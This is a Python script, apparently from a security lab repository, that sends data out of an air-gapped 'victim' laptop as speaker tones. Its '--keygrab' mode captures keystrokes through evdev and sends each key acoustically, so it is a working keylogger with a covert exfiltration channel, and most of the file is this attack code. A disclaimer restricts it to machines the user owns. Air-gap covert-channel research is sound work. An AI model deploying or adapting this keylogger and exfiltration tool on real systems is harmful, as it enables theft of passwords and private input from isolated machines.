#!/usr/bin/env python3
"""Live acoustic sender: play covert-channel frames through the speaker.

Run on the victim (air-gapped) laptop. Modes:
  --message "TEXT"    send a fixed payload (repeat, majority-vote friendly)
  --keygrab           capture keystrokes from evdev and exfil each key

Noise-robust defaults: tones 1000/2500 Hz. Use --tones 400,800 for fan-style.
Uses paplay or pacat (PulseAudio), so alsa-utils is not required.
Educational lab use on machines you own only.
"""

from __future__ import annotations

import argparse
import subprocess
import sys
import time
from pathlib import Path

import numpy as np

# Works both in-repo (labs/01-.../live/) and as a standalone sender bundle
# (flat dir with emitter.py + common/ next to this file).
_HERE = Path(__file__).resolve().parent
if (_HERE / "emitter.py").exists() and (_HERE / "common" / "framing.py").exists():
    sys.path.insert(0, str(_HERE))
else:
    LAB = _HERE.parents[0]  # live/ -> lab dir
    ROOT = LAB.parents[0]   # lab dir -> repo root (labs/..)
    if (LAB / "emitter.py").exists():
        sys.path.insert(0, str(LAB))
        sys.path.insert(0, str(ROOT))
    else:
        sys.path.insert(0, str(_HERE))

from emitter import (  # noqa: E402
    FS,
    SPS,
    TONE0_HZ,
    TONE1_HZ,
    bits_to_tone_wave,
    calibration_wave,
    parse_tones,
    payload_to_bits,
)

GAP_S = 0.5   # silence between frames (lets the room settle)
LEAD_S = 0.35
CALIB_S = 0.35


def wave_to_pcm16(wave: np.ndarray) -> bytes:
    peak = np.max(np.abs(wave)) + 1e-12
    if peak > 0.98:
        wave = wave / peak * 0.97
    return (wave * 32767.0).astype(np.int16).tobytes()


def play_pcm(pcm: bytes, fs: int = FS, device: str | None = None) -> None:
    cmd = ["pacat", "--format=s16", f"--rate={fs}", "--channels=1", "--raw"]
    if device:
        cmd += ["--device", device]
    subprocess.run(cmd, input=pcm, check=True)


def silence(seconds: float, fs: int = FS) -> bytes:
    return b"\x00\x00" * int(seconds * fs)


def frame_wave(payload: bytes, f0: float, f1: float) -> np.ndarray:
    bits = payload_to_bits(payload, fec=True)
    return bits_to_tone_wave(bits, f0=f0, f1=f1)


def send_message(msg: str, repeats: int, device: str | None = None,
                 f0: float = TONE0_HZ, f1: float = TONE1_HZ,
                 calib: bool = True, gain: float = 1.0) -> None:
    payload = msg.encode("utf-8", "replace")
    print(f"[*] send {repeats}x payload={payload!r} fs={FS} tones={f0:.0f}/{f1:.0f} Hz sps={SPS}")
    lead = silence(LEAD_S)
    gap = silence(GAP_S)
    if calib:
        cal = wave_to_pcm16(calibration_wave(f0=f0, f1=f1, tone_s=CALIB_S))
        if gain != 1.0:
            arr = np.frombuffer(cal, dtype=np.int16).astype(np.float64) * gain
            cal = np.clip(arr, -32767, 32767).astype(np.int16).tobytes()
        print("[*] playing calibration tones first")
        play_pcm(lead + cal + gap, device=device)
    for i in range(repeats):
        w = frame_wave(payload, f0, f1)
        if gain != 1.0:
            w = np.clip(w * gain, -0.99, 0.99)
        t0 = time.time()
        play_pcm(lead + wave_to_pcm16(w) + gap, device=device)
        print(f"    frame {i+1}/{repeats} done in {time.time()-t0:.2f}s")
    print("[+] done")


# --- keystroke mode ---------------------------------------------------------

KEYMAP = {
    2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9", 11: "0",
    12: "-", 13: "=", 14: "\b", 15: "\t", 16: "q", 17: "w", 18: "e", 19: "r", 20: "t",
    21: "y", 22: "u", 23: "i", 24: "o", 25: "p", 26: "[", 27: "]", 28: "\n",
    29: None, 30: "a", 31: "s", 32: "d", 33: "f", 34: "g", 35: "h", 36: "j", 37: "k",
    38: "l", 39: ";", 40: "'", 41: "`", 42: None, 43: "\\", 44: "z", 45: "x", 46: "c",
    47: "v", 48: "b", 49: "n", 50: "m", 51: ",", 52: ".", 53: "/", 54: None, 57: " ",
}
SHIFT_MAP = {
    "1": "!", "2": "@", "3": "#", "4": "$", "5": "%", "6": "^", "7": "&", "8": "*",
    "9": "(", "0": ")", "-": "_", "=": "+", "[": "{", "]": "}", ";": ":", "'": '"',
    "`": "~", "\\": "|", ",": "<", ".": ">", "/": "?",
}
for c in "abcdefghijklmnopqrstuvwxyz":
    SHIFT_MAP[c] = c.upper()


def open_keyboard() -> "object":
    from evdev import InputDevice, list_devices

    for path in list_devices():
        dev = InputDevice(path)
        caps = dev.capabilities()
        if 1 in caps and 0x01 in caps.get(1, []):
            keys = caps.get(1, [])
            if 30 in keys and 44 in keys:
                print(f"[*] keyboard: {dev.path} ({dev.name})")
                return dev
    raise SystemExit("no keyboard event device found (try running as root / input group)")


def keygrab_loop(device_out: str | None = None, batch_s: float = 0.0,
                 max_keys: int = 0, f0: float = TONE0_HZ, f1: float = TONE1_HZ) -> None:
    """Capture keys; send each key as its own frame (or batch after batch_s)."""
    from evdev import ecodes

    dev = open_keyboard()
    shift = False
    buf = ""
    nkeys = 0
    print("[*] keygrab active; type on this machine (Ctrl+C to stop)")
    try:
        for ev in dev.read_loop():
            if ev.type != ecodes.EV_KEY:
                continue
            if ev.code in (42, 54):
                shift = ev.value == 1
                continue
            if ev.value != 1:
                continue
            ch = KEYMAP.get(ev.code)
            if ch is None:
                continue
            nkeys += 1
            if ch in ("\b", "\t", "\n"):
                if ch == "\b" and buf:
                    buf = buf[:-1]
                token = {"\b": "<BS>", "\t": "<TAB>", "\n": "<NL>"}[ch]
                if batch_s <= 0:
                    send_message(token, repeats=2, device=device_out, f0=f0, f1=f1, calib=False)
                else:
                    buf += f"|{token}|"
                continue
            if shift:
                ch = SHIFT_MAP.get(ch, ch)
            if batch_s <= 0:
                send_message(ch, repeats=2, device=device_out, f0=f0, f1=f1, calib=False)
            else:
                buf += ch
                if len(buf) >= 16:
                    send_message(buf, repeats=3, device=device_out, f0=f0, f1=f1, calib=False)
                    buf = ""
            if max_keys and nkeys >= max_keys:
                break
    except KeyboardInterrupt:
        print("\n[*] keygrab stopped")
    if buf:
        send_message(buf, repeats=3, device=device_out, f0=f0, f1=f1, calib=False)


def main() -> None:
    ap = argparse.ArgumentParser(description="Live acoustic covert-channel sender")
    ap.add_argument("--message", help="fixed payload to transmit (repeats)")
    ap.add_argument("--repeats", type=int, default=5,
                    help="frames to send; receiver majority-votes (default 5)")
    ap.add_argument("--keygrab", action="store_true", help="live keystroke exfil mode")
    ap.add_argument("--batch", type=float, default=0.0,
                    help="seconds to batch keys before sending (0=per-key)")
    ap.add_argument("--device", help="pulse sink name (default: system default)")
    ap.add_argument("--tones", default=None,
                    help="tone pair Hz as f0,f1 (default 1000,2500; use 400,800 for fan style)")
    ap.add_argument("--gain", type=float, default=1.0,
                    help="linear amplitude scale 0.5-1.0 (default 1.0)")
    ap.add_argument("--no-calib", action="store_true",
                    help="skip the short calibration tone burst")
    ap.add_argument("--selftest", action="store_true",
                    help="play a canned frame to stdout as raw pcm (no audio)")
    args = ap.parse_args()

    f0, f1 = parse_tones(args.tones)

    if args.selftest:
        w = frame_wave(b"LOOPBACK-SELFTEST", f0, f1)
        sys.stdout.buffer.write(wave_to_pcm16(w))
        return

    if args.keygrab:
        keygrab_loop(device_out=args.device, batch_s=args.batch, f0=f0, f1=f1)
        return

    if not args.message:
        ap.error("need --message or --keygrab")
    send_message(args.message, repeats=args.repeats, device=args.device,
                 f0=f0, f1=f1, calib=not args.no_calib, gain=args.gain)


if __name__ == "__main__":
    main()
